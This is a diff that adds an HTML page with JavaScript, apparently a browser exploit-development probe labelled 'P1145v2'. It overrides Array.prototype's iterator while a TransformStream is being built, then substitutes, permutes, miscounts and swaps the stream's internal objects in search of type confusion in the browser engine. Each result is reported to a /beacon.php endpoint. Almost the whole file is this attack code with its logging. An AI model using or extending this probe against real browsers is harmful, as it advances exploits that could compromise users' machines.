@@ -1,0 +1,248 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>P1145v2</title>
+<style>*{margin:0;padding:0;box-sizing:border-box}body{background:#0a0a0f;color:#c8ffc8;font:11px/1.4 monospace;padding:10px;min-height:100vh}#log{white-space:pre-wrap;word-break:break-all}.ok{color:#6f6}.fail{color:#f66}.ptr{color:#f6f}.info{color:#6cf}.phase{color:#fff;font-size:13px;font-weight:bold;margin:6px 0}.win{color:#0f0;font-weight:bold;font-size:14px}</style>
+</head><body><div id="log"></div>
+<script>
+var L=document.getElementById('log');
+function log(c,m){var d=document.createElement('div');d.className=c;d.textContent=m;L.appendChild(d);}
+function B(t,d){try{new Image().src='/beacon.php?tag='+encodeURIComponent(t)+'&data='+encodeURIComponent(d||'')+'&_='+Math.random();}catch(e){}}
+
+log('phase','=== P1145v2: TRANSFORMSTREAM COUNT BYPASS ===');
+log('info','P1145 showed: iterator called 2x, array len=3, substitution WORKS');
+log('info','Error: "unexpected number of values" - we sent 2, need 3!');
+B('P1145V2-START','t='+Date.now());
+
+var origIter=Array.prototype[Symbol.iterator];
+
+// ===== SECTION A: Discover what the 3 elements are =====
+log('phase','--- A: Inspect internal array on FIRST pass ---');
+var firstPassItems=[];
+var passCount=0;
+
+Array.prototype[Symbol.iterator]=function(){
+  passCount++;
+  if(passCount===1 && this.length===3){
+    // First pass: capture the types of all 3 elements
+    for(var i=0;i<this.length;i++){
+      var item=this[i];
+      var info={idx:i, type:typeof item, ctor:'?', str:'?'};
+      try{info.ctor=item.constructor.name;}catch(e){}
+      try{info.str=String(item).substring(0,60);}catch(e){}
+      // Check if it's a stream
+      try{if(item instanceof ReadableStream) info.ctor='ReadableStream';}catch(e){}
+      try{if(item instanceof WritableStream) info.ctor='WritableStream';}catch(e){}
+      // Check for TransformStreamDefaultController
+      try{
+        if(item.enqueue && item.error && item.terminate) info.ctor='TransformStreamDefaultController?';
+        if(item.desiredSize!==undefined) info.ctor+='(hasDesiredSize)';
+      }catch(e){}
+      firstPassItems.push(info);
+    }
+    log('ok','First pass captured '+firstPassItems.length+' items');
+    for(var i=0;i<firstPassItems.length;i++){
+      var fi=firstPassItems[i];
+      log('info','  ['+fi.idx+'] type='+fi.type+' ctor='+fi.ctor+' str='+fi.str);
+    }
+  }
+  return origIter.call(this);
+};
+
+try{
+  passCount=0;
+  var ts1=new TransformStream();
+  log('ok','TS created (inspection only)');
+}catch(e){
+  log('fail','Inspection error: '+e.message);
+}
+B('P1145V2-INSPECT','items='+JSON.stringify(firstPassItems.map(function(fi){return fi.ctor;})));
+
+// Restore
+Array.prototype[Symbol.iterator]=origIter;
+
+// ===== SECTION B: 3-value substitution =====
+log('phase','--- B: 3-value substitution (match count) ---');
+passCount=0;
+var capturedFirst=null;
+
+Array.prototype[Symbol.iterator]=function(){
+  passCount++;
+  if(passCount===1 && this.length===3){
+    // Capture real items from first pass
+    capturedFirst=[this[0],this[1],this[2]];
+  }
+  if(passCount===2 && this.length===3 && capturedFirst){
+    log('win','SUBSTITUTION pass 2 with 3 values!');
+    // Return 3 values: our fake readable, our fake writable, and the REAL third item
+    var fakeR=new ReadableStream({start:function(c){
+      log('win','Fake readable controller start!');
+      c.enqueue('INTERCEPTED');c.close();
+    }});
+    var fakeW=new WritableStream({write:function(chunk){
+      log('win','Fake writable got: '+chunk);
+      B('P1145V2-FAKE-WRITE','chunk='+String(chunk).substring(0,100));
+    }});
+    // Keep third item from the real first pass
+    return [fakeR, fakeW, capturedFirst[2]][Symbol.iterator]();
+  }
+  return origIter.call(this);
+};
+
+var bResult='?';
+try{
+  passCount=0;
+  capturedFirst=null;
+  var ts2=new TransformStream();
+  bResult='OK';
+  log('win','!!! 3-VALUE SUBSTITUTION SUCCEEDED !!!');
+  B('P1145V2-3VAL','result=OK');
+
+  // Try using the stream
+  try{
+    var w2=ts2.writable.getWriter();
+    w2.write('CONFUSION_TEST');
+    w2.close();
+    var r2=ts2.readable.getReader();
+    r2.read().then(function(res){
+      log('win','Read result: '+JSON.stringify(res));
+      B('P1145V2-READ','val='+JSON.stringify(res));
+    },function(e){
+      log('fail','Read rejected: '+e);
+      B('P1145V2-READ-ERR','e='+e);
+    });
+  }catch(e2){
+    log('fail','Stream use: '+e2.message);
+    B('P1145V2-USE-ERR',e2.message);
+  }
+}catch(e){
+  bResult='ERR:'+e.message;
+  log('fail','3-val error: '+e.message);
+  B('P1145V2-3VAL-ERR',e.message);
+}
+
+Array.prototype[Symbol.iterator]=origIter;
+
+// ===== SECTION C: Try all permutations =====
+log('phase','--- C: Permutation attack ---');
+// Maybe the order matters: try [real, fake, real], [fake, real, fake], etc
+
+var permTests=[
+  {name:'FRR',make:function(c){return[new ReadableStream({start:function(ctrl){ctrl.close();}}),c[1],c[2]];}},
+  {name:'RFR',make:function(c){return[c[0],new WritableStream({write:function(){}}),c[2]];}},
+  {name:'RRF',make:function(c){return[c[0],c[1],{enqueue:function(){},error:function(){},terminate:function(){},get desiredSize(){return 1;}}];}},
+  {name:'FFR',make:function(c){return[new ReadableStream({start:function(ctrl){ctrl.close();}}),new WritableStream({write:function(){}}),c[2]];}},
+  {name:'FFF',make:function(c){return[new ReadableStream({start:function(ctrl){ctrl.close();}}),new WritableStream({write:function(){}}),{enqueue:function(){},error:function(){},terminate:function(){},get desiredSize(){return 1;}}];}},
+];
+
+for(var pi=0;pi<permTests.length;pi++){
+  var pt=permTests[pi];
+  passCount=0;
+  capturedFirst=null;
+
+  Array.prototype[Symbol.iterator]=function(){
+    passCount++;
+    if(passCount===1 && this.length===3){
+      capturedFirst=[this[0],this[1],this[2]];
+    }
+    if(passCount===2 && this.length===3 && capturedFirst){
+      try{
+        var faked=pt.make(capturedFirst);
+        return faked[Symbol.iterator]();
+      }catch(e){return origIter.call(this);}
+    }
+    return origIter.call(this);
+  };
+
+  var pResult='?';
+  try{
+    passCount=0;
+    capturedFirst=null;
+    var tsP=new TransformStream();
+    pResult='OK';
+  }catch(e){
+    pResult='ERR:'+e.message.substring(0,60);
+  }
+  log(pResult==='OK'?'win':'fail','Perm '+pt.name+': '+pResult);
+  B('P1145V2-PERM-'+pt.name,pResult);
+
+  Array.prototype[Symbol.iterator]=origIter;
+}
+
+// ===== SECTION D: Iterator that returns different count =====
+log('phase','--- D: Count manipulation ---');
+var countTests=[1,2,3,4,5,0];
+for(var ci=0;ci<countTests.length;ci++){
+  var targetCount=countTests[ci];
+  passCount=0;
+
+  Array.prototype[Symbol.iterator]=function(){
+    passCount++;
+    if(passCount===2 && this.length===3){
+      var arr=[];
+      for(var i=0;i<targetCount;i++){
+        if(i===0) arr.push(new ReadableStream({start:function(c){c.close();}}));
+        else if(i===1) arr.push(new WritableStream({write:function(){}}));
+        else arr.push(null);
+      }
+      return arr[Symbol.iterator]();
+    }
+    return origIter.call(this);
+  };
+
+  var cResult='?';
+  try{
+    passCount=0;
+    var tsC=new TransformStream();
+    cResult='OK('+targetCount+')';
+  }catch(e){
+    cResult='ERR:'+e.message.substring(0,40);
+  }
+  log(cResult.indexOf('OK')===0?'win':'fail','Count='+targetCount+': '+cResult);
+  B('P1145V2-COUNT-'+targetCount,cResult);
+
+  Array.prototype[Symbol.iterator]=origIter;
+}
+
+// ===== SECTION E: Type confusion via wrong object types =====
+log('phase','--- E: Type mismatch (wrong object in slot) ---');
+// If we pass a WritableStream where ReadableStream is expected...
+passCount=0;
+capturedFirst=null;
+
+Array.prototype[Symbol.iterator]=function(){
+  passCount++;
+  if(passCount===1 && this.length===3) capturedFirst=[this[0],this[1],this[2]];
+  if(passCount===2 && this.length===3 && capturedFirst){
+    // SWAP readable and writable positions!
+    return [capturedFirst[1], capturedFirst[0], capturedFirst[2]][Symbol.iterator]();
+  }
+  return origIter.call(this);
+};
+
+var eResult='?';
+try{
+  passCount=0;
+  capturedFirst=null;
+  var tsE=new TransformStream();
+  eResult='OK:SWAPPED';
+  log('win','!!! TYPE SWAP ACCEPTED !!!');
+
+  // Can we write to .readable (which is actually writable)?
+  try{
+    var rTest=tsE.readable;
+    var wTest=tsE.writable;
+    log('info','readable type: '+(rTest instanceof ReadableStream?'RS':'NOT-RS')+' '+(rTest instanceof WritableStream?'WS':'NOT-WS'));
+    log('info','writable type: '+(wTest instanceof ReadableStream?'RS':'NOT-RS')+' '+(wTest instanceof WritableStream?'WS':'NOT-WS'));
+    B('P1145V2-SWAP-TYPES','r_isRS='+(rTest instanceof ReadableStream)+'|r_isWS='+(rTest instanceof WritableStream)+'|w_isRS='+(wTest instanceof ReadableStream)+'|w_isWS='+(wTest instanceof WritableStream));
+  }catch(e3){
+    log('fail','Type check: '+e3.message);
+  }
+}catch(e){
+  eResult='ERR:'+e.message.substring(0,60);
+  log('fail','Swap: '+eResult);
+}
+B('P1145V2-SWAP',eResult);
+
+Array.prototype[Symbol.iterator]=origIter;
+
+B('P1145V2-DONE','inspect='+firstPassItems.length+'|3val='+bResult);
+log('phase','=== P1145v2 COMPLETE ===');
+</script></body></html>
